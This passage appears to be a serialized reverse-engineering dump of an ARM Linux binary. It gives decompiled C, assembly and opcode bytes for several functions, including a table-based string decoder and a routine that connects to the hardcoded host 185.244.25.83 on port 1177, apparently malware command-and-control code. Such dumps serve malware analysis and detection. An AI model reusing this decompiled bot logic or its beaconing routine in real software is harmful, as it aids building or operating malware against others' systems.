1a a0 e3\n07 1c 81 e2\n16 11 81 e2\n00 20 a0 e3\n0b fd ff eb\n05 00 a0 e3\n1e fd ff eb\ncb ff ff ea\n04 00 a0 e3\nf1 08 00 eb\n05 00 a0 e3\nef 08 00 eb\n06 00 a0 e3\ned 08 00 eb\n07 00 a0 e3\neb 08 00 eb\n08 00 a0 e3\ne9 08 00 eb\n09 00 a0 e3\ne7 08 00 eb\n0a 00 a0 e3\ne5 08 00 eb\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p460
S'.text:00009200\n.text:00009204\n.text:00009208\n.text:0000920c\n.text:00009210\n.text:00009214\n.text:00009218\n.text:0000921c\n.text:00009220\n.text:00009224\n.text:00009228\n.text:0000922c\n.text:00009230\n.text:00009234\n.text:00009238\n.text:0000923c\n.text:00009240\n.text:00009244\n.text:00009248\n.text:0000924c\n.text:00009250\n.text:00009254\n.text:00009258\n.text:0000925c\n.text:00009260\n.text:00009264\n.text:00009268\n.text:0000926c\n.text:00009270\n.text:00009274\n.text:00009278\n.text:0000927c\n.text:00009280\n.text:00009284\n.text:00009288\n.text:0000928c\n.text:00009290\n.text:00009294\n.text:00009298\n.text:0000929c\n.text:000092a0\n.text:000092a4\n.text:000092a8\n.text:000092ac\n.text:000092b0\n.text:000092b4\n.text:000092b8\n.text:000092bc\n.text:000092c0\n.text:000092c4\n.text:000092c8\n.text:000092cc\n.text:000092d0\n.text:000092d4\n.text:000092d8\n.text:000092dc\n.text:000092e0\n.text:000092e4\n.text:000092e8\n.text:000092ec\n.text:000092f0\n.text:000092f4\n.text:000092f8\n.text:000092fc\n.text:00009300\n.text:00009304\n.text:00009308\n.text:0000930c\n.text:00009310\n.text:00009314\n.text:00009318\n.text:0000931c\n.text:00009320\n.text:00009324\n.text:00009328\n.text:0000932c\n.text:00009330\n.text:00009334\n.text:00009338\n.text:0000933c\n.text:00009340\n.text:00009344\n.text:00009348\n.text:0000934c\n.text:00009350\n.text:00009354\n.text:00009358\n.text:0000935c\n.text:00009360\n.text:00009364\n.text:00009368\n.text:0000936c\n.text:00009370\n.text:00009374\n.text:00009378\n.text:0000937c\n.text:00009380\n.text:00009384\n.text:00009388\n.text:0000938c\n.text:00009390\n.text:00009394\n.text:00009398\n.text:0000939c\n.text:000093a0\n.text:000093a4\n.text:000093a8\n.text:000093ac\n.text:000093b0\n.text:000093b4\n.text:000093b8\n.text:000093bc\n.text:000093c0\n.text:000093c4\n.text:000093c8\n.text:000093cc\n.text:000093d0\n.text:000093d4\n.text:000093d8\n.text:000093dc\n.text:000093e0\n.text:000093e4\n.text:000093e8\n.text:000093ec\n.text:000093f0\n.text:000093f4\n.text:000093f8\n.text:000093fc\n.text:00009400\n.text:00009404\n.text:00009408\n.text:0000940c\n.text:00009410\n.text:00009414\n.text:00009418\n.text:0000941c\n.text:00009420\n.text:00009424\n.text:00009428\n.text:0000942c\n.text:00009430\n.text:00009434\n.text:00009438\n.text:0000943c\n.text:00009440\n.text:00009444\n.text:00009448\n.text:0000944c\n.text:00009450\n.text:00009454\n.text:00009458\n.text:0000945c\n.text:00009460\n.text:00009464\n.text:00009468\n.text:0000946c\n.text:00009470\n.text:00009474\n.text:00009478\n.text:0000947c\n.text:00009480\n.text:00009484\n.text:00009488\n.text:0000948c\n.text:00009490\n.text:00009494\n.text:00009498\n.text:0000949c\n.text:000094a0\n.text:000094a4\n.text:000094a8\n.text:000094ac\n.text:000094b0\n.text:000094b4\n.text:000094b8\n.text:000094bc\n.text:000094c0\n.text:000094c4\n.text:000094c8\n.text:000094cc\n.text:000094d0\n.text:000094d4\n.text:000094d8\n.text:000094dc\n.text:000094e0\n.text:000094e4\n.text:000094e8\n.text:000094ec\n.text:000094f0\n.text:000094f4\n.text:000094f8\n.text:000094fc\n.text:00009500\n.text:00009504\n.text:00009508\n.text:0000950c\n.text:00009510\n.text:00009514\n.text:00009518\n.text:0000951c\n.text:00009520\n.text:00009524\n.text:00009528\n.text:0000952c\n.text:00009530\n.text:00009534\n.text:00009538\n.text:0000953c\n.text:00009540\n.text:00009544\n.text:00009548\n.text:0000954c\n.text:00009550\n.text:00009554\n.text:00009558\n.text:0000955c\n.text:00009560\n.text:00009564\n.text:00009568\n.text:0000956c\n.text:00009570\n.text:00009574\n.text:00009578\n.text:0000957c\n.text:00009580\n.text:00009584\n.text:00009588\n.text:0000958c\n.text:00009590\n.text:00009594\n.text:00009598\n.text:0000959c\n.text:000095a0\n.text:000095a4\n.text:000095a8\n.text:000095ac\n.text:000095b0\n.text:000095b4\n.text:000095b8\n.text:000095bc\n.text:000095c0\n.text:000095c4\n.text:000095c8\n.text:000095cc\n.text:000095d0\n.text:000095d4\n.text:000095d8\n.text:000095dc\n.text:000095e0\n.text:000095e4\n'
p461
tp462
sS'FUN_0000b570'
p463
(S'\n__stdcall FUN_0000b570()\n'
p464
V\u000aint FUN_0000b570(int iParm1,int iParm2,int iParm3,int iParm4)\u000a\u000a{\u000a  int local_18;\u000a  int local_14;\u000a  \u000a  local_14 = 0;\u000a  if (iParm4 <= iParm2) {\u000a    local_18 = 0;\u000a    while (local_18 < iParm2) {\u000a      if (*(char *)(local_18 + iParm1) == *(char *)(local_14 + iParm3)) {\u000a        local_14 = local_14 + 1;\u000a        if (local_14 == iParm4) {\u000a          return local_18 + 1;\u000a        }\u000a      }\u000a      else {\u000a        local_14 = 0;\u000a      }\u000a      local_18 = local_18 + 1;\u000a    }\u000a  }\u000a  return 0xffffffff;\u000a}\u000a\u000a
p465
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x20\nstr r0,[r11,#-0x18]\nstr r1,[r11,#-0x1c]\nstr r2,[r11,#-0x20]\nstr r3,[r11,#-0x24]\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nldr r2,[r11,#-0x24]\nldr r3,[r11,#-0x1c]\ncmp r2,r3\nble 0x0000b5b4\nmvn r3,#0x0\nstr r3,[r11,#-0x28]\nb 0x0000b648\nmov r3,#0x0\nstr r3,[r11,#-0x14]\nb 0x0000b630\nldr r3,[r11,#-0x14]\ncpy r2,r3\nldr r3,[r11,#-0x18]\nadd r3,r2,r3\nldrb r1,[r3,#0x0]\nldr r3,[r11,#-0x10]\ncpy r2,r3\nldr r3,[r11,#-0x20]\nadd r3,r2,r3\nldrb r3,[r3,#0x0]\ncmp r1,r3\nbne 0x0000b61c\nldr r3,[r11,#-0x10]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x10]\nldr r2,[r11,#-0x10]\nldr r3,[r11,#-0x24]\ncmp r2,r3\nbne 0x0000b624\nldr r3,[r11,#-0x14]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x28]\nb 0x0000b648\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x14]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x14]\nldr r2,[r11,#-0x14]\nldr r3,[r11,#-0x1c]\ncmp r2,r3\nblt 0x0000b5c0\nmvn r3,#0x0\nstr r3,[r11,#-0x28]\nldr r3,[r11,#-0x28]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p466
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n20 d0 4d e2\n18 00 0b e5\n1c 10 0b e5\n20 20 0b e5\n24 30 0b e5\n00 30 a0 e3\n10 30 0b e5\n24 20 1b e5\n1c 30 1b e5\n03 00 52 e1\n02 00 00 da\n00 30 e0 e3\n28 30 0b e5\n24 00 00 ea\n00 30 a0 e3\n14 30 0b e5\n1b 00 00 ea\n14 30 1b e5\n03 20 a0 e1\n18 30 1b e5\n03 30 82 e0\n00 10 d3 e5\n10 30 1b e5\n03 20 a0 e1\n20 30 1b e5\n03 30 82 e0\n00 30 d3 e5\n03 00 51 e1\n0a 00 00 1a\n10 30 1b e5\n01 30 83 e2\n10 30 0b e5\n10 20 1b e5\n24 30 1b e5\n03 00 52 e1\n05 00 00 1a\n14 30 1b e5\n01 30 83 e2\n28 30 0b e5\n0a 00 00 ea\n00 30 a0 e3\n10 30 0b e5\n14 30 1b e5\n01 30 83 e2\n14 30 0b e5\n14 20 1b e5\n1c 30 1b e5\n03 00 52 e1\ndf ff ff ba\n00 30 e0 e3\n28 30 0b e5\n28 30 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p467
S'.text:0000b570\n.text:0000b574\n.text:0000b578\n.text:0000b57c\n.text:0000b580\n.text:0000b584\n.text:0000b588\n.text:0000b58c\n.text:0000b590\n.text:0000b594\n.text:0000b598\n.text:0000b59c\n.text:0000b5a0\n.text:0000b5a4\n.text:0000b5a8\n.text:0000b5ac\n.text:0000b5b0\n.text:0000b5b4\n.text:0000b5b8\n.text:0000b5bc\n.text:0000b5c0\n.text:0000b5c4\n.text:0000b5c8\n.text:0000b5cc\n.text:0000b5d0\n.text:0000b5d4\n.text:0000b5d8\n.text:0000b5dc\n.text:0000b5e0\n.text:0000b5e4\n.text:0000b5e8\n.text:0000b5ec\n.text:0000b5f0\n.text:0000b5f4\n.text:0000b5f8\n.text:0000b5fc\n.text:0000b600\n.text:0000b604\n.text:0000b608\n.text:0000b60c\n.text:0000b610\n.text:0000b614\n.text:0000b618\n.text:0000b61c\n.text:0000b620\n.text:0000b624\n.text:0000b628\n.text:0000b62c\n.text:0000b630\n.text:0000b634\n.text:0000b638\n.text:0000b63c\n.text:0000b640\n.text:0000b644\n.text:0000b648\n.text:0000b64c\n.text:0000b650\n.text:0000b654\n.text:0000b658\n'
p468
tp469
sS'FUN_0000b450'
p470
(S'\n__stdcall FUN_0000b450()\n'
p471
V\u000avoid FUN_0000b450(char *pcParm1,int iParm2)\u000a\u000a{\u000a  char *__src;\u000a  undefined4 uVar1;\u000a  size_t sVar2;\u000a  int extraout_r1;\u000a  int local_40;\u000a  char *local_3c;\u000a  char acStack56 [36];\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0xb45c;\u000a  FUN_0000b928(3);\u000a  __src = (char *)FUN_0000b9c0(3,0);\u000a  strcpy(acStack56,__src);\u000a  local_40 = iParm2;\u000a  local_3c = pcParm1;\u000a  while( true ) {\u000a    local_40 = local_40 + -1;\u000a    if (local_40 == -1) break;\u000a    uVar1 = FUN_0000b2a4();\u000a    sVar2 = strlen(acStack56);\u000a    FUN_0000bd38(uVar1,sVar2);\u000a    *local_3c = acStack56[extraout_r1];\u000a    local_3c = local_3c + 1;\u000a  }\u000a  FUN_0000b974(3);\u000a  return;\u000a}\u000a\u000a
p472
S'cpy r12,sp\nstmdb sp!,{ r4 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x2c\nstr r0,[r11,#-0x38]\nstr r1,[r11,#-0x3c]\nmov r0,#0x3\nbl 0x0000b928\nmov r0,#0x3\nmov r1,#0x0\nbl 0x0000b9c0\ncpy r2,r0\nsub r3,r11,#0x34\ncpy r0,r3\ncpy r1,r2\nbl 0x000089bc\nb 0x0000b4e4\nbl 0x0000b2a4\ncpy r4,r0\nsub r3,r11,#0x34\ncpy r0,r3\nbl 0x00008b90\ncpy r3,r0\ncpy r0,r4\ncpy r1,r3\nbl 0x0000bd38\ncpy r3,r1\nmvn r2,#0x1f\nsub r1,r11,#0x14\nadd r3,r1,r3\nadd r3,r3,r2\nldrb r3,[r3,#0x0]\nldr r2,[r11,#-0x38]\nstrb r3,[r2,#0x0]\nldr r3,[r11,#-0x38]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x38]\nldr r3,[r11,#-0x3c]\nsub r3,r3,#0x1\nstr r3,[r11,#-0x3c]\nldr r3,[r11,#-0x3c]\ncmn r3,#0x1\nbne 0x0000b494\nmov r0,#0x3\nbl 0x0000b974\nsub sp,r11,#0x10\nldmia sp,{ r4 r11 sp lr }\nbx lr\n'
p473
S'0d c0 a0 e1\n10 d8 2d e9\n04 b0 4c e2\n2c d0 4d e2\n38 00 0b e5\n3c 10 0b e5\n03 00 a0 e3\n2d 01 00 eb\n03 00 a0 e3\n00 10 a0 e3\n50 01 00 eb\n00 20 a0 e1\n34 30 4b e2\n03 00 a0 e1\n02 10 a0 e1\n4a f5 ff eb\n13 00 00 ea\n82 ff ff eb\n00 40 a0 e1\n34 30 4b e2\n03 00 a0 e1\nb9 f5 ff eb\n00 30 a0 e1\n04 00 a0 e1\n03 10 a0 e1\n1f 02 00 eb\n01 30 a0 e1\n1f 20 e0 e3\n14 10 4b e2\n03 30 81 e0\n02 30 83 e0\n00 30 d3 e5\n38 20 1b e5\n00 30 c2 e5\n38 30 1b e5\n01 30 83 e2\n38 30 0b e5\n3c 30 1b e5\n01 30 43 e2\n3c 30 0b e5\n3c 30 1b e5\n01 00 73 e3\ne5 ff ff 1a\n03 00 a0 e3\n1b 01 00 eb\n10 d0 4b e2\n10 68 9d e8\n1e ff 2f e1\n'
p474
S'.text:0000b450\n.text:0000b454\n.text:0000b458\n.text:0000b45c\n.text:0000b460\n.text:0000b464\n.text:0000b468\n.text:0000b46c\n.text:0000b470\n.text:0000b474\n.text:0000b478\n.text:0000b47c\n.text:0000b480\n.text:0000b484\n.text:0000b488\n.text:0000b48c\n.text:0000b490\n.text:0000b494\n.text:0000b498\n.text:0000b49c\n.text:0000b4a0\n.text:0000b4a4\n.text:0000b4a8\n.text:0000b4ac\n.text:0000b4b0\n.text:0000b4b4\n.text:0000b4b8\n.text:0000b4bc\n.text:0000b4c0\n.text:0000b4c4\n.text:0000b4c8\n.text:0000b4cc\n.text:0000b4d0\n.text:0000b4d4\n.text:0000b4d8\n.text:0000b4dc\n.text:0000b4e0\n.text:0000b4e4\n.text:0000b4e8\n.text:0000b4ec\n.text:0000b4f0\n.text:0000b4f4\n.text:0000b4f8\n.text:0000b4fc\n.text:0000b500\n.text:0000b504\n.text:0000b508\n.text:0000b50c\n'
p475
tp476
sS'kill'
p477
(S'\n__stdcall kill(__pid_t __pid, int __sig)\n'
p478
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint kill(__pid_t __pid,int __sig)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a78. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014110)();\u000a  return iVar1;\u000a}\u000a\u000a
p479
S'adr r12,0x8a78\nadd r12,r12,#0xb000\nldr pc,[r12,#0x698]!\n'
p480
S'00 c6 8f e2\n0b ca 8c e2\n98 f6 bc e5\n'
p481
S'.plt:00008a70\n.plt:00008a74\n.plt:00008a78\n'
p482
tp483
sS'sigprocmask'
p484
(S'\n__stdcall sigprocmask(int __how, sigset_t * __set, sigset_t * __oset)\n'
p485
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint sigprocmask(int __how,sigset_t *__set,sigset_t *__oset)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008bec. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_0001418c)();\u000a  return iVar1;\u000a}\u000a\u000a
p486
S'adr r12,0x8bec\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5a0]!\n'
p487
S'00 c6 8f e2\n0b ca 8c e2\na0 f5 bc e5\n'
p488
S'.plt:00008be4\n.plt:00008be8\n.plt:00008bec\n'
p489
tp490
sS'FUN_00008f4c'
p491
(S'\n__stdcall FUN_00008f4c()\n'
p492
V\u000avoid FUN_00008f4c(char *pcParm1)\u000a\u000a{\u000a  uint uVar1;\u000a  size_t sVar2;\u000a  undefined auStack548 [512];\u000a  uint local_24;\u000a  int local_20;\u000a  uint local_1c;\u000a  undefined4 uStack4;\u000a  \u000a  uStack4 = 0x8f58;\u000a  local_24 = 0;\u000a  local_20 = 0;\u000a  memset(auStack548,0,0x200);\u000a  while (uVar1 = local_24, sVar2 = strlen(pcParm1), uVar1 < sVar2) {\u000a    local_1c = 0;\u000a    while (local_1c < 0x48) {\u000a      if (pcParm1[local_24] == PTR_DAT_00009028[local_1c]) {\u000a        PTR_DAT_00009030[local_20] = PTR_DAT_0000902c[local_1c];\u000a        local_20 = local_20 + 1;\u000a      }\u000a      local_1c = local_1c + 1;\u000a    }\u000a    local_24 = local_24 + 1;\u000a  }\u000a  return;\u000a}\u000a\u000a
p493
S'cpy r12,sp\nstmdb sp!,{ r4 r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x21c\nstr r0,[r11,#-0x228]\nmov r3,#0x0\nstr r3,[r11,#-0x20]\nmov r3,#0x0\nstr r3,[r11,#-0x1c]\nsub r3,r11,#0x220\ncpy r0,r3\nmov r1,#0x0\nmov r2,#0x200\nbl 0x00008b18\nb 0x00009004\nmov r3,#0x0\nstr r3,[r11,#-0x18]\nb 0x00008fec\nldr r3,[r11,#-0x20]\ncpy r2,r3\nldr r3,[r11,#-0x228]\nadd r3,r2,r3\nldrb r1,[r3,#0x0]\nldr r2,[r11,#-0x18]\nldr r3,[0x9028]\nldrb r3,[r3,r2]\ncmp r1,r3\nbne 0x00008fe0\nldr r1,[r11,#-0x1c]\nldr r2,[r11,#-0x18]\nldr r3,[0x902c]\nldrb r3,[r3,r2]\nldr r2,[0x9030]\nstrb r3,[r2,r1]\nldr r3,[r11,#-0x1c]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x18]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x18]\ncmp r3,#0x47\nbls 0x00008f94\nldr r3,[r11,#-0x20]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x20]\nldr r4,[r11,#-0x20]\nldr r0,[r11,#-0x228]\nbl 0x00008b90\ncpy r3,r0\ncmp r4,r3\nbcc 0x00008f88\nsub sp,r11,#0x10\nldmia sp,{ r4 r11 sp lr }\nbx lr\n'
p494
S'0d c0 a0 e1\n10 d8 2d e9\n04 b0 4c e2\n87 df 4d e2\n28 02 0b e5\n00 30 a0 e3\n20 30 0b e5\n00 30 a0 e3\n1c 30 0b e5\n22 3e 4b e2\n03 00 a0 e1\n00 10 a0 e3\n02 2c a0 e3\ne4 fe ff eb\n1e 00 00 ea\n00 30 a0 e3\n18 30 0b e5\n15 00 00 ea\n20 30 1b e5\n03 20 a0 e1\n28 32 1b e5\n03 30 82 e0\n00 10 d3 e5\n18 20 1b e5\n74 30 9f e5\n02 30 d3 e7\n03 00 51 e1\n08 00 00 1a\n1c 10 1b e5\n18 20 1b e5\n60 30 9f e5\n02 30 d3 e7\n5c 20 9f e5\n01 30 c2 e7\n1c 30 1b e5\n01 30 83 e2\n1c 30 0b e5\n18 30 1b e5\n01 30 83 e2\n18 30 0b e5\n18 30 1b e5\n47 00 53 e3\ne6 ff ff 9a\n20 30 1b e5\n01 30 83 e2\n20 30 0b e5\n20 40 1b e5\n28 02 1b e5\ndf fe ff eb\n00 30 a0 e1\n03 00 54 e1\nda ff ff 3a\n10 d0 4b e2\n10 68 9d e8\n1e ff 2f e1\n'
p495
S'.text:00008f4c\n.text:00008f50\n.text:00008f54\n.text:00008f58\n.text:00008f5c\n.text:00008f60\n.text:00008f64\n.text:00008f68\n.text:00008f6c\n.text:00008f70\n.text:00008f74\n.text:00008f78\n.text:00008f7c\n.text:00008f80\n.text:00008f84\n.text:00008f88\n.text:00008f8c\n.text:00008f90\n.text:00008f94\n.text:00008f98\n.text:00008f9c\n.text:00008fa0\n.text:00008fa4\n.text:00008fa8\n.text:00008fac\n.text:00008fb0\n.text:00008fb4\n.text:00008fb8\n.text:00008fbc\n.text:00008fc0\n.text:00008fc4\n.text:00008fc8\n.text:00008fcc\n.text:00008fd0\n.text:00008fd4\n.text:00008fd8\n.text:00008fdc\n.text:00008fe0\n.text:00008fe4\n.text:00008fe8\n.text:00008fec\n.text:00008ff0\n.text:00008ff4\n.text:00008ff8\n.text:00008ffc\n.text:00009000\n.text:00009004\n.text:00009008\n.text:0000900c\n.text:00009010\n.text:00009014\n.text:00009018\n.text:0000901c\n.text:00009020\n.text:00009024\n'
p496
tp497
sS'FUN_00009c3c'
p498
(S'\n__stdcall FUN_00009c3c()\n'
p499
V\u000aundefined4 FUN_00009c3c(void)\u000a\u000a{\u000a  int iVar1;\u000a  int *piVar2;\u000a  int local_128;\u000a  socklen_t local_124;\u000a  timeval local_120;\u000a  uint auStack280 [58];\u000a  sa_family_t local_30;\u000a  uint16_t local_2e;\u000a  in_addr_t local_2c;\u000a  uint local_20;\u000a  int local_1c;\u000a  uint local_18;\u000a  uint *local_14;\u000a  __fd_mask _Stack4;\u000a  \u000a  _Stack4 = 0x9c48;\u000a  local_20 = fcntl(*(int *)PTR_DAT_00009ec4,3,0);\u000a  local_20 = local_20 | 0x800;\u000a  fcntl(*(int *)PTR_DAT_00009ec4,4,local_20);\u000a  iVar1 = socket(2,1,0);\u000a  *(int *)PTR_DAT_00009ec4 = iVar1;\u000a  local_30 = 2;\u000a  local_2e = htons(0x499);\u000a  local_2c = inet_addr(PTR_s_185_244_25_83_00009ec8);\u000a  local_1c = connect(*(int *)PTR_DAT_00009ec4,(sockaddr *)&local_30,0x10);\u000a  if (local_1c < 0) {\u000a    piVar2 = __errno_location();\u000a    if (*piVar2 != 0x73) {\u000a      return 0;\u000a    }\u000a    local_120.tv_sec = 0x1e;\u000a    local_120.tv_usec = 0;\u000a    local_14 = auStack280;\u000a    local_18 = 0;\u000a    while (local_18 < 0x20) {\u000a      local_14[local_18] = 0;\u000a      local_18 = local_18 + 1;\u000a    }\u000a    auStack280[*(uint *)PTR_DAT_00009ec4 >> 5] =\u000a         auStack280[*(uint *)PTR_DAT_00009ec4 >> 5] | 1 << (*(uint *)PTR_DAT_00009ec4 & 0x1f);\u000a    iVar1 = select(*(int *)PTR_DAT_00009ec4 + 1,(fd_set *)0x0,(fd_set *)auStack280,(fd_set *)0x0,\u000a                   &local_120);\u000a    if (iVar1 < 1) {\u000a      return 0;\u000a    }\u000a    local_124 = 4;\u000a    getsockopt(*(int *)PTR_DAT_00009ec4,1,4,&local_128,&local_124);\u000a    if (local_128 != 0) {\u000a      return 0;\u000a    }\u000a  }\u000a  local_20 = fcntl(*(int *)PTR_DAT_00009ec4,3,0);\u000a  local_20 = local_20 & 0xfffff7ff;\u000a  fcntl(*(int *)PTR_DAT_00009ec4,4,local_20);\u000a  return 1;\u000a}\u000a\u000a
p500
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x128\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x3\nmov r2,#0x0\nbl 0x00008bc0\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\norr r3,r3,#0x800\nstr r3,[r11,#-0x1c]\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x4\nldr r2,[r11,#-0x1c]\nbl 0x00008bc0\nmov r0,#0x2\nmov r1,#0x1\nmov r2,#0x0\nbl 0x00008a28\ncpy r2,r0\nldr r3,[0x9ec4]\nstr r2,[r3,#0x0]\nmov r3,#0x2\nstrh r3,[r11,#-0x2c]\nmov r0,#0x490\nadd r0,r0,#0x9\nbl 0x00008b54\ncpy r3,r0\nstrh r3,[r11,#-0x2a]\nldr r0,[0x9ec8]\nbl 0x00008a94\ncpy r3,r0\nstr r3,[r11,#-0x28]\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\nsub r2,r11,#0x2c\ncpy r0,r3\ncpy r1,r2\nmov r2,#0x10\nbl 0x000089d4\ncpy r3,r0\nstr r3,[r11,#-0x18]\nldr r3,[r11,#-0x18]\ncmp r3,#0x0\nbge 0x00009e64\nbl 0x00008b60\ncpy r3,r0\nldr r3,[r3,#0x0]\ncmp r3,#0x73\nbne 0x00009e58\nmov r3,#0x1e\nstr r3,[r11,#-0x11c]\nmov r3,#0x0\nstr r3,[r11,#-0x118]\nsub r3,r11,#0x114\nstr r3,[r11,#-0x10]\nmov r3,#0x0\nstr r3,[r11,#-0x14]\nb 0x00009d5c\nldr r1,[r11,#-0x14]\nldr r2,[r11,#-0x10]\nmov r3,#0x0\nstr r3,[r2,r1,lsl #0x2]\nldr r3,[r11,#-0x14]\nadd r3,r3,#0x1\nstr r3,[r11,#-0x14]\nldr r3,[r11,#-0x14]\ncmp r3,#0x1f\nbls 0x00009d40\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\nmov r3,r3, lsr #0x5\ncpy r0,r3\ncpy r2,r3\nmov r3,#0xbe000000\nmov r3,r3, asr #0x16\nmov r2,r2, lsl #0x2\nsub r1,r11,#0xc\nadd r2,r2,r1\nadd r3,r2,r3\nldr r1,[r3,#0x0]\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\nand r2,r3,#0x1f\nmov r3,#0x1\nmov r3,r3, lsl r2\norr r1,r1,r3\nmov r3,#0xbe000000\nmov r3,r3, asr #0x16\nmov r2,r0, lsl #0x2\nsub r0,r11,#0xc\nadd r2,r2,r0\nadd r3,r2,r3\nstr r1,[r3,#0x0]\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\nadd r2,r3,#0x1\nsub r12,r11,#0x114\nsub r3,r11,#0x11c\nstr r3,[sp,#0x0]\ncpy r0,r2\nmov r1,#0x0\ncpy r2,r12\nmov r3,#0x0\nbl 0x00008a34\ncpy r3,r0\ncmp r3,#0x0\nble 0x00009e4c\nmov r3,#0x4\nstr r3,[r11,#-0x120]\nldr r3,[0x9ec4]\nldr r2,[r3,#0x0]\nsub r12,r11,#0x124\nsub r3,r11,#0x120\nstr r3,[sp,#0x0]\ncpy r0,r2\nmov r1,#0x1\nmov r2,#0x4\ncpy r3,r12\nbl 0x00008b48\nldr r3,[r11,#-0x124]\ncmp r3,#0x0\nbeq 0x00009e64\nmov r1,#0x0\nstr r1,[r11,#-0x128]\nb 0x00009eb0\nmov r3,#0x0\nstr r3,[r11,#-0x128]\nb 0x00009eb0\nmov r0,#0x0\nstr r0,[r11,#-0x128]\nb 0x00009eb0\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x3\nmov r2,#0x0\nbl 0x00008bc0\ncpy r3,r0\nstr r3,[r11,#-0x1c]\nldr r3,[r11,#-0x1c]\nbic r3,r3,#0x800\nstr r3,[r11,#-0x1c]\nldr r3,[0x9ec4]\nldr r3,[r3,#0x0]\ncpy r0,r3\nmov r1,#0x4\nldr r2,[r11,#-0x1c]\nbl 0x00008bc0\nmov r1,#0x1\nstr r1,[r11,#-0x128]\nldr r3,[r11,#-0x128]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p501
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n4a df 4d e2\n70 32 9f e5\n00 30 93 e5\n03 00 a0 e1\n03 10 a0 e3\n00 20 a0 e3\nd6 fb ff eb\n00 30 a0 e1\n1c 30 0b e5\n1c 30 1b e5\n02 3b 83 e3\n1c 30 0b e5\n44 32 9f e5\n00 30 93 e5\n03 00 a0 e1\n04 10 a0 e3\n1c 20 1b e5\ncb fb ff eb\n02 00 a0 e3\n01 10 a0 e3\n00 20 a0 e3\n61 fb ff eb\n00 20 a0 e1\n18 32 9f e5\n00 20 83 e5\n02 30 a0 e3\nbc 32 4b e1\n49 0e a0 e3\n09 00 80 e2\na4 fb ff eb\n00 30 a0 e1\nba 32 4b e1\nf8 01 9f e5\n70 fb ff eb\n00 30 a0 e1\n28 30 0b e5\ne4 31 9f e5\n00 30 93 e5\n2c 20 4b e2\n03 00 a0 e1\n02 10 a0 e1\n10 20 a0 e3\n37 fb ff eb\n00 30 a0 e1\n18 30 0b e5\n18 30 1b e5\n00 00 53 e3\n56 00 00 aa\n94 fb ff eb\n00 30 a0 e1\n00 30 93 e5\n73 00 53 e3\n4e 00 00 1a\n1e 30 a0 e3\n1c 31 0b e5\n00 30 a0 e3\n18 31 0b e5\n45 3f 4b e2\n10 30 0b e5\n00 30 a0 e3\n14 30 0b e5\n06 00 00 ea\n14 10 1b e5\n10 20 1b e5\n00 30 a0 e3\n01 31 82 e7\n14 30 1b e5\n01 30 83 e2\n14 30 0b e5\n14 30 1b e5\n1f 00 53 e3\nf5 ff ff 9a\n54 31 9f e5\n00 30 93 e5\na3 32 a0 e1\n03 00 a0 e1\n03 20 a0 e1\nbe 34 a0 e3\n43 3b a0 e1\n02 21 a0 e1\n0c 10 4b e2\n01 20 82 e0\n03 30 82 e0\n00 10 93 e5\n24 31 9f e5\n00 30 93 e5\n1f 20 03 e2\n01 30 a0 e3\n13 32 a0 e1\n03 10 81 e1\nbe 34 a0 e3\n43 3b a0 e1\n00 21 a0 e1\n0c 00 4b e2\n00 20 82 e0\n03 30 82 e0\n00 10 83 e5\nf0 30 9f e5\n00 30 93 e5\n01 20 83 e2\n45 cf 4b e2\n47 3f 4b e2\n00 30 8d e5\n02 00 a0 e1\n00 10 a0 e3\n0c 20 a0 e1\n00 30 a0 e3\n0e fb ff eb\n00 30 a0 e1\n00 00 53 e3\n11 00 00 da\n04 30 a0 e3\n20 31 0b e5\nb0 30 9f e5\n00 20 93 e5\n49 cf 4b e2\n12 3e 4b e2\n00 30 8d e5\n02 00 a0 e1\n01 10 a0 e3\n04 20 a0 e3\n0c 30 a0 e1\n44 fb ff eb\n24 31 1b e5\n00 00 53 e3\n08 00 00 0a\n00 10 a0 e3\n28 11 0b e5\n18 00 00 ea\n00 30 a0 e3\n28 31 0b e5\n15 00 00 ea\n00 00 a0 